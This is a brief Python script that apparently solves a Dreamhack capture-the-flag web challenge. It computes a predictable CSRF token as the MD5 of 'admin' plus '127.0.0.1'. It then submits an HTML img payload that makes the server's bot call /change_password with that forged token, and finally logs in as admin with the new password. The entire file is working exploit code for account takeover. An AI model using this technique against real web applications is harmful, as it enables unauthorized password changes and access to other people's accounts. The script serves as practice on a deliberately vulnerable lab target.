import requests
from hashlib import md5

port = 20461
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_login = url_index + "login"

username = "admin"
address = "127.0.0.1"
csrf_token = md5((username + address).encode()).hexdigest()

param = {"param": f'<img src="/change_password?pw=brian&csrftoken={csrf_token}">'}

r = requests.post(url_flag, data=param)

param = {"username": "admin", "password": "brian"}

r = requests.post(url_login, data=param)
print(r.text)
